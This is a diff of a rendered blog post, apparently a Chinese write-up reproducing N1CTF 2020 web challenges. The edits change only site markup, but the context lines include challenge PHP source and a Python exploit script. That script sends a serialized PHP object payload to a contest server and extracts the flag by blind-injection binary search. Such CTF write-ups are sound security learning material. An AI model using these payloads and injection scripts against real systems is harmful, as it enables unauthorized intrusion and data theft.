@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>N1CTF2020赛后复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -266,7 +266,7 @@
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -318,7 +318,7 @@
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">ip</span> <span class="p">{</span>
     <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
     <span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$info</span><span class="p">){</span>
@@ -384,7 +384,7 @@
 <p>exp：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -419,14 +419,14 @@
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://101.32.205.189/?input=O:4:</span><span class="si">%22f</span><span class="s1">lag%22:2:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;O:2:</span><span class="si">%22i</span><span class="s1">p%22:1:{s:2:</span><span class="si">%22i</span><span class="s1">p%22;N;}s:5:</span><span class="si">%22c</span><span class="s1">heck%22;N;}&#39;</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 <span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;[+]Injection start...&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]Injection start...&#34;</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
     <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
     <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
@@ -446,7 +446,7 @@
         <span class="k">elif</span> <span class="s2">&#34;&lt;code&gt;noip&lt;/code&gt;&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
             <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
     <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
         <span class="k">break</span>
@@ -459,7 +459,7 @@
 <p>开局源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -482,7 +482,7 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">print_r</span><span class="p">(</span><span class="s2">&#34;show me your filters!&#34;</span><span class="p">)</span><span class="o">:</span> <span class="k">die</span><span class="p">(</span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">));</span>
 <span class="nv">$input</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filters&#39;</span><span class="p">]);</span>
